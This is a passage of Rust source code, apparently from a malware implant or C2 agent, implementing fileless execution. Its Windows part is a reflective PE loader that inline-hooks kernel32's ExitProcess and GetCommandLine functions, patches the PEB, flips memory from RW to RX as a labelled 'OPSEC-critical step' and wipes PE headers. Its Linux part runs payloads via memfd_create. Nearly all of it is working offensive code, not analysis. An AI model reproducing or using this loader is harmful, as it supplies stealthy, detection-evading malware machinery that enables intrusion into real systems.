    let vt: u16 = 0x2000 | 8;
    variant[0..2].copy_from_slice(&vt.to_le_bytes());
    let ptr_bytes = (inner as usize).to_le_bytes();
    variant[8..8+std::mem::size_of::<usize>()].copy_from_slice(&ptr_bytes);
    let idx: i32 = 0;
    SafeArrayPutElement(outer, &idx, variant.as_ptr() as *const _);
    outer as *mut std::ffi::c_void
}

// ══════════════════════════════════════════════════════════════════════════════
// MEMEXEC — Windows (in-process reflective PE loader with RW→RX)
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(windows)]
static PIPE_OUTPUT: std::sync::Mutex<Vec<u8>> = std::sync::Mutex::new(Vec::new());

/// Install a permanent inline hook on kernel32!ExitProcess → ExitThread.
/// Safe to call multiple times — uses `Once` to install only on the first call.
#[cfg(windows)]
fn _install_exit_process_hook() {
    use std::sync::Once;
    static HOOK_ONCE: Once = Once::new();
    HOOK_ONCE.call_once(|| unsafe {
        extern "system" { fn ExitThread(code: u32) -> !; }
        let k32_name = crate::s!("kernel32.dll");
        let k32_cstr = format!("{}\0", k32_name);
        let exit_name = crate::s!("ExitProcess");
        let exit_cstr = format!("{}\0", exit_name);
        let k32 = {
            use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
            GetModuleHandleA(k32_cstr.as_ptr()) as *mut std::ffi::c_void
        };
        let addr = crate::dynapi::get_proc_address(k32, exit_cstr.as_ptr()) as *mut u8;
        if addr.is_null() { return; }
        let mut old_prot = 0u32;
        crate::dynapi::virtual_protect(addr as _, 12, 0x40, &mut old_prot);
        let target = ExitThread as usize;
        *addr.add(0) = 0x48;
        *addr.add(1) = 0xB8;
        *(addr.add(2) as *mut u64) = target as u64;
        *addr.add(10) = 0xFF;
        *addr.add(11) = 0xE0;
        crate::dynapi::virtual_protect(addr as _, 12, old_prot, &mut old_prot);
        crate::dlog!("memexec", "permanent hook: kernel32!ExitProcess -> ExitThread at 0x{:x}", addr as usize);
    });
}

/// Custom cmdline buffers for inline-hooked GetCommandLineW/A.
/// When non-null, the hooked functions return these instead of the originals.
#[cfg(windows)]
static CMDLINE_W_OVERRIDE: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
#[cfg(windows)]
static CMDLINE_A_OVERRIDE: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

/// Saved original bytes from GetCommandLineW/A inline hooks.
#[cfg(windows)]
static SAVED_GETCMDW: std::sync::Mutex<[u8; 14]> = std::sync::Mutex::new([0u8; 14]);
#[cfg(windows)]
static SAVED_GETCMDA: std::sync::Mutex<[u8; 14]> = std::sync::Mutex::new([0u8; 14]);
#[cfg(windows)]
static CMDLINE_HOOKS_INSTALLED: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

/// Our replacement GetCommandLineW — returns the override buffer.
#[cfg(windows)]
unsafe extern "system" fn _hooked_get_cmdline_w() -> *mut u16 {
    let p = CMDLINE_W_OVERRIDE.load(std::sync::atomic::Ordering::Relaxed);
    if p != 0 { return p as *mut u16; }
    // Fallback: read from PEB directly
    let peb: *mut u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    let params = *(peb.add(0x20) as *const *mut u8);
    *(params.add(0x78) as *const *mut u16)
}

/// Our replacement GetCommandLineA — returns the override buffer.
#[cfg(windows)]
unsafe extern "system" fn _hooked_get_cmdline_a() -> *mut u8 {
    let p = CMDLINE_A_OVERRIDE.load(std::sync::atomic::Ordering::Relaxed);
    if p != 0 { return p as *mut u8; }
    // Fallback: call the real function by temporarily unhooking
    // (rare path — only hit if override was cleared but hook still active)
    std::ptr::null_mut()
}

/// Install inline hooks on GetCommandLineW and GetCommandLineA.
/// Called once; the hooks redirect to our functions above.
#[cfg(windows)]
unsafe fn _install_cmdline_hooks() {
    if CMDLINE_HOOKS_INSTALLED.load(std::sync::atomic::Ordering::Relaxed) { return; }

    let k32_name = crate::s!("kernel32.dll");
    let k32_cstr = format!("{}\0", k32_name);
    let k32 = {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
        GetModuleHandleA(k32_cstr.as_ptr()) as *mut std::ffi::c_void
    };

    // Hook GetCommandLineW
    let gcw_name = crate::s!("GetCommandLineW");
    let gcw_cstr = format!("{}\0", gcw_name);
    let gcw_addr = crate::dynapi::get_proc_address(k32, gcw_cstr.as_ptr()) as *mut u8;
    if !gcw_addr.is_null() {
        let mut old_prot = 0u32;
        crate::dynapi::virtual_protect(gcw_addr as _, 14, 0x40, &mut old_prot);
        if let Ok(mut saved) = SAVED_GETCMDW.lock() {
            core::ptr::copy_nonoverlapping(gcw_addr, saved.as_mut_ptr(), 14);
        }
        // mov rax, imm64; jmp rax (12 bytes) + 2 pad
        let target = _hooked_get_cmdline_w as usize;
        *gcw_addr.add(0) = 0x48;
        *gcw_addr.add(1) = 0xB8;
        *(gcw_addr.add(2) as *mut u64) = target as u64;
        *gcw_addr.add(10) = 0xFF;
        *gcw_addr.add(11) = 0xE0;
        crate::dynapi::virtual_protect(gcw_addr as _, 14, old_prot, &mut old_prot);
        crate::dlog!("memexec", "hooked GetCommandLineW at 0x{:x}", gcw_addr as usize);
    }

    // Hook GetCommandLineA
    let gca_name = crate::s!("GetCommandLineA");
    let gca_cstr = format!("{}\0", gca_name);
    let gca_addr = crate::dynapi::get_proc_address(k32, gca_cstr.as_ptr()) as *mut u8;
    if !gca_addr.is_null() {
        let mut old_prot = 0u32;
        crate::dynapi::virtual_protect(gca_addr as _, 14, 0x40, &mut old_prot);
        if let Ok(mut saved) = SAVED_GETCMDA.lock() {
            core::ptr::copy_nonoverlapping(gca_addr, saved.as_mut_ptr(), 14);
        }
        let target = _hooked_get_cmdline_a as usize;
        *gca_addr.add(0) = 0x48;
        *gca_addr.add(1) = 0xB8;
        *(gca_addr.add(2) as *mut u64) = target as u64;
        *gca_addr.add(10) = 0xFF;
        *gca_addr.add(11) = 0xE0;
        crate::dynapi::virtual_protect(gca_addr as _, 14, old_prot, &mut old_prot);
        crate::dlog!("memexec", "hooked GetCommandLineA at 0x{:x}", gca_addr as usize);
    }

    CMDLINE_HOOKS_INSTALLED.store(true, std::sync::atomic::Ordering::Relaxed);
}

/// Patch command line so the loaded PE sees our args.
///
/// Three layers:
///  1. PEB UNICODE_STRING — patched in-place (or new alloc if too long)
///  2. GetCommandLineW()  — inline-hooked to return our wide buffer
///  3. GetCommandLineA()  — inline-hooked to return our ANSI buffer
///
/// The hooks are installed once and stay active; the override pointers
/// (atomics) are set before each PE run and cleared on restore.
#[cfg(windows)]
struct SavedCmdline {
    orig_len_field: u16,
    orig_max_field: u16,
    orig_buf_ptr: *mut u16,
    alloc_w: *mut u16,
    alloc_a: *mut u8,
    saved_w: Vec<u16>,
}

#[cfg(windows)]
unsafe fn _patch_cmdline(args: &str) -> SavedCmdline {
    // Install GetCommandLineW/A hooks (idempotent)
    _install_cmdline_hooks();

    let peb: *mut u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    let params = *(peb.add(0x20) as *const *mut u8);
    let cl_ptr = params.add(0x70);
    let orig_len_bytes = *(cl_ptr as *const u16);
    let orig_max_bytes = *(cl_ptr.add(2) as *const u16);
    let orig_buf       = *(cl_ptr.add(8) as *const *mut u16);
    let orig_chars = (orig_len_bytes as usize) / 2;
    let max_chars  = (orig_max_bytes as usize) / 2;

    let saved_w: Vec<u16> = std::slice::from_raw_parts(orig_buf, orig_chars.min(max_chars)).to_vec();

    let cmdline = if args.is_empty() { "a.exe".to_string() }
        else { format!("a.exe {}", args) };

    // ── Wide buffer ──
    let new_wide: Vec<u16> = cmdline.encode_utf16().chain(std::iter::once(0)).collect();
    let need_chars = new_wide.len();

    let (alloc_w, w_ptr) = if need_chars <= max_chars {
        // Fits in PEB buffer — write in-place, no separate alloc needed
        let mut old_prot = 0u32;
        crate::dynapi::virtual_protect(orig_buf as _, orig_max_bytes as usize, 0x04, &mut old_prot);
        core::ptr::copy_nonoverlapping(new_wide.as_ptr(), orig_buf, need_chars);
        for i in need_chars..max_chars { *orig_buf.add(i) = 0; }
        crate::dynapi::virtual_protect(orig_buf as _, orig_max_bytes as usize, old_prot, &mut old_prot);
        let new_len = ((need_chars - 1) * 2) as u16; // exclude null
        *(cl_ptr as *mut u16) = new_len;
        (std::ptr::null_mut(), orig_buf)
    } else {
        // Allocate new buffer
        let alloc_bytes = need_chars * 2;
        let p = crate::dynapi::virtual_alloc(
            std::ptr::null(), alloc_bytes, 0x3000, 0x04,
        ) as *mut u16;
        if !p.is_null() {
            core::ptr::copy_nonoverlapping(new_wide.as_ptr(), p, need_chars);
            // Also update PEB for code that reads directly from PEB
            let buf_field = cl_ptr.add(8) as *mut *mut u16;
            *buf_field = p;
            *(cl_ptr.add(2) as *mut u16) = (alloc_bytes as u16).max(orig_max_bytes);
            let new_len = ((need_chars - 1) * 2) as u16;
            *(cl_ptr as *mut u16) = new_len;
        }
        (p, if p.is_null() { orig_buf } else { p })
    };

    // Set the wide override for our hooked GetCommandLineW
    CMDLINE_W_OVERRIDE.store(w_ptr as usize, std::sync::atomic::Ordering::Relaxed);

    crate::dlog!("memexec", "cmdline patched: need={} avail={} alloc={} ptr=0x{:x}",
        need_chars, max_chars, !alloc_w.is_null(), w_ptr as usize);

    // ── ANSI buffer ──
    let ansi_bytes = cmdline.as_bytes();
    let alloc_a = {
        let a_len = ansi_bytes.len() + 1;
        let p = crate::dynapi::virtual_alloc(
            std::ptr::null(), a_len, 0x3000, 0x04,
        ) as *mut u8;
        if !p.is_null() {
            core::ptr::copy_nonoverlapping(ansi_bytes.as_ptr(), p, ansi_bytes.len());
            *p.add(ansi_bytes.len()) = 0;
            CMDLINE_A_OVERRIDE.store(p as usize, std::sync::atomic::Ordering::Relaxed);
        }
        p
    };

    SavedCmdline {
        orig_len_field: orig_len_bytes,
        orig_max_field: orig_max_bytes,
        orig_buf_ptr: orig_buf,
        alloc_w,
        alloc_a,
        saved_w,
    }
}

/// Restore original command line and clear hook overrides.
#[cfg(windows)]
unsafe fn _restore_cmdline(saved: &SavedCmdline) {
    // Clear hook overrides — hooked functions will fall back to PEB
    CMDLINE_W_OVERRIDE.store(0, std::sync::atomic::Ordering::Relaxed);
    CMDLINE_A_OVERRIDE.store(0, std::sync::atomic::Ordering::Relaxed);

    // Restore PEB UNICODE_STRING
    let peb: *mut u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    let params = *(peb.add(0x20) as *const *mut u8);
    let cl_ptr = params.add(0x70);

    if !saved.alloc_w.is_null() {
        // Restore PEB pointer to original buffer
        let buf_field = cl_ptr.add(8) as *mut *mut u16;
        *buf_field = saved.orig_buf_ptr;
        *(cl_ptr.add(2) as *mut u16) = saved.orig_max_field;
    }

    // Restore original wide content
    let max_chars = (saved.orig_max_field as usize) / 2;
    let mut old_prot = 0u32;
    crate::dynapi::virtual_protect(saved.orig_buf_ptr as _, saved.orig_max_field as usize, 0x04, &mut old_prot);
    let restore_chars = saved.saved_w.len().min(max_chars);
    core::ptr::copy_nonoverlapping(saved.saved_w.as_ptr(), saved.orig_buf_ptr, restore_chars);
    for i in restore_chars..max_chars { *saved.orig_buf_ptr.add(i) = 0; }
    *(cl_ptr as *mut u16) = saved.orig_len_field;
    crate::dynapi::virtual_protect(saved.orig_buf_ptr as _, saved.orig_max_field as usize, old_prot, &mut old_prot);

    // Free allocated buffers
    if !saved.alloc_w.is_null() {
        crate::dynapi::virtual_free(saved.alloc_w as _, 0, 0x8000);
    }
    if !saved.alloc_a.is_null() {
        crate::dynapi::virtual_free(saved.alloc_a as _, 0, 0x8000);
    }
}

#[cfg(windows)]
unsafe extern "system" fn _pipe_reader(param: *mut std::ffi::c_void) -> u32 {
    use windows_sys::Win32::Storage::FileSystem::ReadFile;
    let rd = param as isize;
    let mut buf = [0u8; 4096];
    loop {
        let mut n = 0u32;
        let ok = ReadFile(rd, buf.as_mut_ptr() as _, buf.len() as u32, &mut n, std::ptr::null_mut());
        if ok == 0 || n == 0 { break; }
        if let Ok(mut out) = PIPE_OUTPUT.lock() {
            out.extend_from_slice(&buf[..n as usize]);
            if out.len() > 4 * 1024 * 1024 { break; }
        }
    }
    0
}

#[cfg(windows)]
fn _take_pipe_output() -> Vec<u8> {
    if let Ok(mut out) = PIPE_OUTPUT.lock() {
        std::mem::take(&mut *out)
    } else {
        Vec::new()
    }
}

#[cfg(windows)]
fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
    const MEM_COMMIT:  u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_READWRITE:       u32 = 0x04;
    const PAGE_EXECUTE_READ:    u32 = 0x20;
    const PAGE_READONLY:        u32 = 0x02;
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    const IMAGE_SCN_MEM_WRITE:   u32 = 0x8000_0000;
    const IMAGE_SCN_MEM_READ:    u32 = 0x4000_0000;
    const IMAGE_DIRECTORY_ENTRY_IMPORT:    usize = 1;
    const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
    const IMAGE_REL_BASED_DIR64: u16 = 10;

    if pe_data.len() < 0x40 {
        return "[memexec] PE too small".to_string();
    }
    if pe_data[0] != 0x4D || pe_data[1] != 0x5A {
        return "[memexec] Invalid PE: bad MZ magic".to_string();
    }

    let e_lfanew = _pe_read_u32(pe_data, 0x3C) as usize;
    if e_lfanew + 0x108 > pe_data.len() {
        return "[memexec] Invalid PE: e_lfanew OOB".to_string();
    }
    if pe_data[e_lfanew..e_lfanew+4] != [0x50, 0x45, 0x00, 0x00] {
        return "[memexec] Invalid PE: bad PE signature".to_string();
    }

    let n_sections   = _pe_read_u16(pe_data, e_lfanew + 0x06) as usize;
    let opt_hdr_size = _pe_read_u16(pe_data, e_lfanew + 0x14) as usize;
    let opt          = e_lfanew + 0x18;

    if _pe_read_u16(pe_data, opt) != 0x020B {
        return "[memexec] Only PE32+ (x64) supported".to_string();
    }

    let image_size = _pe_read_u32(pe_data, opt + 0x38) as usize;
    let hdr_size   = _pe_read_u32(pe_data, opt + 0x3C) as usize;
    let preferred  = _pe_read_u64(pe_data, opt + 0x18) as usize;
    let oep_rva    = _pe_read_u32(pe_data, opt + 0x10) as usize;
    let dd_off     = opt + 0x70;
    let sec_table  = e_lfanew + 0x18 + opt_hdr_size;

    crate::dlog!("memexec", "PE: size={} sections={} image_size=0x{:x} preferred=0x{:x} oep=0x{:x}",
        pe_data.len(), n_sections, image_size, preferred, oep_rva);

    unsafe {
        // 1. Allocate RW memory (never RWX)
        let mut base = crate::dynapi::virtual_alloc(
            preferred as _, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        ) as usize;
        if base == 0 {
            base = crate::dynapi::virtual_alloc(
                std::ptr::null(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
            ) as usize;
        }
        if base == 0 {
            return "[memexec] VirtualAlloc failed".to_string();
        }
        crate::dlog!("memexec", "alloc base=0x{:x} size=0x{:x}", base, image_size);

        // 2. Copy headers
        if hdr_size > pe_data.len() {
            crate::dynapi::virtual_free(base as _, 0, MEM_RELEASE);
            return "[memexec] Header size exceeds file".to_string();
        }
        core::ptr::copy_nonoverlapping(pe_data.as_ptr(), base as *mut u8, hdr_size);

        // 3. Copy sections
        for i in 0..n_sections {
            let s = sec_table + i * 0x28;
            if s + 0x28 > pe_data.len() { break; }
            let v_addr  = _pe_read_u32(pe_data, s + 0x0C) as usize;
            let raw_sz  = _pe_read_u32(pe_data, s + 0x10) as usize;
            let raw_off = _pe_read_u32(pe_data, s + 0x14) as usize;
            if raw_sz == 0 { continue; }
            if raw_off + raw_sz > pe_data.len() { continue; }
            core::ptr::copy_nonoverlapping(
                pe_data.as_ptr().add(raw_off),
                (base + v_addr) as *mut u8,
                raw_sz,
            );
        }

        // 4. Relocations
        let reloc_rva  = _pe_read_u32(pe_data, dd_off + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8) as usize;
        let reloc_size = _pe_read_u32(pe_data, dd_off + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8 + 4) as usize;
        if reloc_rva != 0 && reloc_size != 0 {
            let delta = base.wrapping_sub(preferred) as isize;
            let mut off = 0usize;
            while off + 8 <= reloc_size {
                let block_va   = *((base + reloc_rva + off) as *const u32) as usize;
                let block_size = *((base + reloc_rva + off + 4) as *const u32) as usize;
                if block_size < 8 { break; }
                let entries = (block_size - 8) / 2;
                for e in 0..entries {
                    let entry = *((base + reloc_rva + off + 8 + e * 2) as *const u16);
                    let kind  = entry >> 12;
                    let roff  = (entry & 0x0FFF) as usize;
                    if kind == IMAGE_REL_BASED_DIR64 {
                        let target = (base + block_va + roff) as *mut isize;
                        *target = (*target).wrapping_add(delta);
                    }
                }
                off += block_size;
            }
        }

        // 5. Patch kernel32's cached GetCommandLineW/A buffers in-place
        let saved_cmdline = _patch_cmdline(args);

        // 6. Resolve imports (normal resolution — no IAT hooks needed)
        let import_rva = _pe_read_u32(pe_data, dd_off + IMAGE_DIRECTORY_ENTRY_IMPORT * 8) as usize;
        if import_rva != 0 {
            let mut desc = base + import_rva;
            loop {
                let name_rva = *((desc + 0x0C) as *const u32) as usize;
                let iat_rva  = *((desc + 0x10) as *const u32) as usize;
                if name_rva == 0 && iat_rva == 0 { break; }

                let dll_name = (base + name_rva) as *const u8;
                let dll_h = crate::dynapi::load_library_a(dll_name) as *mut std::ffi::c_void;
                if !dll_h.is_null() {
                    let orig_rva = *((desc) as *const u32) as usize;
                    let thunk_base = if orig_rva != 0 { orig_rva } else { iat_rva };
                    let mut idx = 0usize;
                    loop {
                        let thunk_val = *((base + thunk_base + idx * 8) as *const usize);
                        if thunk_val == 0 { break; }
                        let func = if thunk_val >> 63 != 0 {
                            crate::dynapi::get_proc_address(dll_h, (thunk_val & 0xFFFF) as *const u8)
                        } else {
                            crate::dynapi::get_proc_address(dll_h, (base + thunk_val + 2) as *const u8)
                        };
                        *((base + iat_rva + idx * 8) as *mut usize) = func as usize;
                        idx += 1;
                    }
                }
                desc += 0x14;
            }
        }
        crate::dlog!("memexec", "imports resolved");

        // 6b. Inline-hook kernel32!ExitProcess → ExitThread (permanent)
        // Installed once and never restored — residual PE threads that call
        // ExitProcess after our main thread finishes just ExitThread harmlessly.
        // The agent itself never calls ExitProcess (Rust exits via libc).
        _install_exit_process_hook();

        // 7. RW → RX per-section (the OPSEC-critical step)
        let mut old: u32 = 0;
        for i in 0..n_sections {
            let s = sec_table + i * 0x28;
            if s + 0x28 > pe_data.len() { break; }
            let v_addr = _pe_read_u32(pe_data, s + 0x0C) as usize;
            let v_size = _pe_read_u32(pe_data, s + 0x08) as usize;
            let raw_sz = _pe_read_u32(pe_data, s + 0x10) as usize;
            let chars  = _pe_read_u32(pe_data, s + 0x24);
            let size   = v_size.max(raw_sz);
            if size == 0 { continue; }

            let prot = if chars & IMAGE_SCN_MEM_EXECUTE != 0 {
                if chars & IMAGE_SCN_MEM_WRITE != 0 { 0x40 /* PAGE_EXECUTE_READWRITE — rare, some packers need it */ }
                else { PAGE_EXECUTE_READ }
            } else if chars & IMAGE_SCN_MEM_WRITE != 0 {
                PAGE_READWRITE
            } else if chars & IMAGE_SCN_MEM_READ != 0 {
                PAGE_READONLY
            } else {
                PAGE_READWRITE
            };
            crate::dynapi::virtual_protect((base + v_addr) as _, size, prot, &mut old);
        }

        // 8. Wipe PE header from mapped image
        crate::dynapi::virtual_protect(base as _, hdr_size.min(0x1000), PAGE_READWRITE, &mut old);
        core::ptr::write_bytes(base as *mut u8, 0, hdr_size.min(0x1000));
        crate::dynapi::virtual_protect(base as _, hdr_size.min(0x1000), PAGE_READONLY, &mut old);

        // 9. Verify patched command line
        {
            extern "system" { fn GetCommandLineW() -> *const u16; }
            let w = GetCommandLineW();
            let len = (0usize..).take_while(|&i| *w.add(i) != 0).count();
            let s = String::from_utf16_lossy(std::slice::from_raw_parts(w, len));
            crate::dlog!("memexec", "GetCommandLineW after patch: {:?}", s);
        }

        // 10. Redirect stdout/stderr via pipe, run entry in new thread
        use windows_sys::Win32::System::Pipes::CreatePipe;
        use windows_sys::Win32::System::Console::{SetStdHandle, GetStdHandle, STD_OUTPUT_HANDLE};
        use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;

        // Clear pipe output buffer from any prior run
        let _ = _take_pipe_output();

        let mut rd = INVALID_HANDLE_VALUE;
        let mut wr = INVALID_HANDLE_VALUE;
        CreatePipe(&mut rd, &mut wr, std::ptr::null(), 0);
        let old_out = GetStdHandle(STD_OUTPUT_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, wr);

        // Pack entry + args into a context struct the thread can read
        struct ExecCtx { entry: usize, _args: Vec<String> }
        let argv: Vec<String> = if args.is_empty() { vec![] }
            else { args.split_whitespace().map(String::from).collect() };
        let entry_addr = base + oep_rva;
        let ctx = Box::into_raw(Box::new(ExecCtx { entry: entry_addr, _args: argv }));

        unsafe extern "system" fn _pe_thread(param: *mut std::ffi::c_void) -> u32 {
            extern "system" { fn GetCurrentThreadId() -> u32; }
            GUARDED_THREAD_ID.store(GetCurrentThreadId(), std::sync::atomic::Ordering::Relaxed);
            GUARDED_CRASH_CODE.store(0, std::sync::atomic::Ordering::Relaxed);
            let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                let ctx = Box::from_raw(param as *mut ExecCtx);
                type EntryFn = unsafe extern "system" fn() -> u32;
                let entry: EntryFn = std::mem::transmute(ctx.entry);
                entry()
            }));
            GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);
            match result {
                Ok(ret) => ret,
                Err(_) => 0xDEAD0003,
            }
        }

        extern "system" {
            fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32) -> *mut std::ffi::c_void;
            fn RemoveVectoredExceptionHandler(handle: *mut std::ffi::c_void) -> u32;
        }
        let veh = AddVectoredExceptionHandler(1, _guarded_veh_handler);

        crate::dlog!("memexec", "launching PE thread, entry=0x{:x}", entry_addr);
        let th = crate::dynapi::create_thread(
            std::ptr::null_mut(), 0, _pe_thread, ctx as *mut std::ffi::c_void, 0, std::ptr::null_mut(),
        );
        if th == 0 {
            RemoveVectoredExceptionHandler(veh);
            SetStdHandle(STD_OUTPUT_HANDLE, old_out);
            crate::dynapi::close_handle(wr);
            crate::dynapi::close_handle(rd);
            _restore_cmdline(&saved_cmdline);
            crate::dynapi::virtual_free(base as _, 0, MEM_RELEASE);
            return "[memexec] CreateThread failed".to_string();
        }

        // Read output while the PE thread runs — closing wr signals EOF to ReadFile
        // so we must read in a separate thread that pulls from `rd` concurrently.
        let rd_for_reader = rd;
        let reader_handle = crate::dynapi::create_thread(
            std::ptr::null_mut(), 0, _pipe_reader, rd_for_reader as *mut std::ffi::c_void, 0, std::ptr::null_mut(),
        );

        crate::dynapi::wait_for_single_object(th, 60_000);

        extern "system" {
            fn GetExitCodeThread(h: isize, code: *mut u32) -> i32;
            fn TerminateThread(h: isize, code: u32) -> i32;
        }
        let mut exit_code: u32 = 0;
        GetExitCodeThread(th, &mut exit_code);
        crate::dlog!("memexec", "PE thread exit_code=0x{:x}", exit_code);

        let veh_crash = GUARDED_CRASH_CODE.load(std::sync::atomic::Ordering::Relaxed);
        let timed_out = exit_code == 259; // STILL_ACTIVE
        let crashed = veh_crash != 0 || (!timed_out && exit_code >= 0xC0000000);

        if timed_out {
            crate::dlog!("memexec", "PE timed out — terminating thread");
            TerminateThread(th, 1);
        }
        crate::dynapi::close_handle(th);
        RemoveVectoredExceptionHandler(veh);
        GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);

        // Restore stdout and close write end (signals EOF to reader)
        crate::dynapi::close_handle(wr);
        SetStdHandle(STD_OUTPUT_HANDLE, old_out);

        // Wait for reader thread to finish draining the pipe
        if reader_handle != 0 {
            crate::dynapi::wait_for_single_object(reader_handle, 5_000);
            crate::dynapi::close_handle(reader_handle);
        }

        // Collect output from global buffer
        let output = _take_pipe_output();
        crate::dynapi::close_handle(rd);

        _restore_cmdline(&saved_cmdline);

        // PE headers already wiped at step 7.  Sections stay intact —
        // residual CRT/DLL threads may still reference code/data.
        // ExitProcess stays hooked permanently so late ExitProcess calls
        // just kill the thread, never the process.
        crate::dlog!("memexec", "cleanup complete, sections left for residual threads");

        let captured = if output.is_empty() { String::new() }
            else { String::from_utf8_lossy(&output).to_string() };

        if timed_out {
            if captured.is_empty() { "[memexec] Timed out (60s) — no output captured".to_string() }
            else { format!("{}\n[memexec] WARNING: timed out after 60s", captured) }
        } else if crashed {
            crate::dlog!("memexec", "PE crashed with exception 0x{:x}", exit_code);
            if captured.is_empty() { format!("[memexec] PE crashed (exception 0x{:08X})", exit_code) }
            else { format!("{}\n[memexec] PE crashed (exception 0x{:08X})", captured, exit_code) }
        } else if captured.is_empty() {
            "[memexec] OK (no output)".to_string()
        } else {
            captured
        }
    }
}

#[cfg(windows)]
#[inline] fn _pe_read_u16(buf: &[u8], off: usize) -> u16 {
    u16::from_le_bytes(buf[off..off+2].try_into().unwrap_or([0;2]))
}
#[cfg(windows)]
#[inline] fn _pe_read_u32(buf: &[u8], off: usize) -> u32 {
    u32::from_le_bytes(buf[off..off+4].try_into().unwrap_or([0;4]))
}
#[cfg(windows)]
#[inline] fn _pe_read_u64(buf: &[u8], off: usize) -> u64 {
    u64::from_le_bytes(buf[off..off+8].try_into().unwrap_or([0;8]))
}

// ══════════════════════════════════════════════════════════════════════════════
// MEMFD_EXEC — Linux
// ══════════════════════════════════════════════════════════════════════════════

#[cfg(target_os = "linux")]
fn _memexec_linux(elf_data: &[u8], args: &str) -> String {
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    if elf_data.len() < 4 || &elf_data[0..4] != b"\x7fELF" {
        return "[memexec] Invalid ELF magic".to_string();
    }

    let fd = unsafe { libc::syscall(libc::SYS_memfd_create, b"ld\0".as_ptr(), 1u32) as i32 };
    if fd < 0 {
        return format!("[memexec] memfd_create failed: {}", std::io::Error::last_os_error());
    }

    {
        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        if let Err(e) = file.write_all(elf_data) {
            return format!("[memexec] write failed: {}", e);
        }
        std::mem::forget(file); // keep fd open
    }

    // Parse args
    let argv: Vec<String> = if args.is_empty() {
        vec!["prog".into()]
    } else {
        let mut v = vec!["prog".into()];
        v.extend(_split_args(args));
        v
    };

    let mut pipe_out = [0i32; 2];
    unsafe { libc::pipe(pipe_out.as_mut_ptr()); }

    let pid = unsafe { libc::fork() };
    match pid {
        -1 => { unsafe { libc::close(fd); } format!("[memexec] fork failed: {}", std::io::Error::last_os_error()) }
        0 => unsafe {
            libc::dup2(pipe_out[1], 1);
            libc::dup2(pipe_out[1], 2);
            libc::close(pipe_out[0]);
            libc::close(pipe_out[1]);

            let c_argv: Vec<std::ffi::CString> = argv.iter()
                .map(|a| std::ffi::CString::new(a.as_str()).unwrap_or_default()).collect();
            let c_ptrs: Vec<*const libc::c_char> = c_argv.iter()
                .map(|a| a.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();
            let c_env: Vec<std::ffi::CString> = std::env::vars()
                .map(|(k,v)| std::ffi::CString::new(format!("{}={}", k, v)).unwrap_or_default()).collect();
            let c_env_ptrs: Vec<*const libc::c_char> = c_env.iter()
                .map(|e| e.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();

            let path = format!("/proc/self/fd/{}\0", fd);
            libc::execve(path.as_ptr() as _, c_ptrs.as_ptr(), c_env_ptrs.as_ptr());
            libc::_exit(127);
        },
        child => {
            unsafe { libc::close(pipe_out[1]); libc::close(fd); }

            let mut output = Vec::new();
            let mut buf = [0u8; 4096];
            let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);

            loop {
                if std::time::Instant::now() > deadline {
                    unsafe { libc::kill(child, libc::SIGKILL); }
                    output.extend_from_slice(b"\n[TIMEOUT 60s]");
                    break;
                }
                unsafe { let fl = libc::fcntl(pipe_out[0], libc::F_GETFL); libc::fcntl(pipe_out[0], libc::F_SETFL, fl | libc::O_NONBLOCK); }
                let n = unsafe { libc::read(pipe_out[0], buf.as_mut_ptr() as _, buf.len()) };
                if n > 0 {
                    output.extend_from_slice(&buf[..n as usize]);
                    if output.len() > 4 * 1024 * 1024 { output.extend_from_slice(b"\n[TRUNCATED]"); break; }
                } else if n == 0 { break; }
                else { std::thread::sleep(std::time::Duration::from_millis(50)); }

                let mut st = 0i32;
                let w = unsafe { libc::waitpid(child, &mut st, libc::WNOHANG) };
                if w == child {
                    loop { let n = unsafe { libc::read(pipe_out[0], buf.as_mut_ptr() as _, buf.len()) }; if n <= 0 { break; } output.extend_from_slice(&buf[..n as usize]); }
                    let code = if libc::WIFEXITED(st) { libc::WEXITSTATUS(st) } else { -1 };
                    output.extend_from_slice(format!("\n[exit {}]", code).as_bytes());
                    break;
                }
            }
            unsafe { libc::close(pipe_out[0]); let mut st = 0; libc::waitpid(child, &mut st, 0); }

            if output.is_empty() { "[memexec] OK (no output)".to_string() }
            else { String::from_utf8_lossy(&output).to_string() }
        }
    }
}

#[cfg(target_os = "linux")]
fn _split_args(s: &str) -> Vec<String> {
    let mut res = Vec::new();
    let mut cur = String::new();
    let mut sq = false;
    let mut dq = false;
    let mut esc = false;
    for ch in s.chars() {
        if esc { cur.push(ch); esc = false; continue; }
        match ch {
            '\\' if !sq => esc = true,
            '\'' if !dq => sq = !sq,
            '"' if !sq => dq = !dq,
            ' ' | '\t' if !sq && !dq => { if !cur.is_empty() { res.push(std::mem::take(&mut cur)); } }
            _ => cur.push(ch),
        }
    }
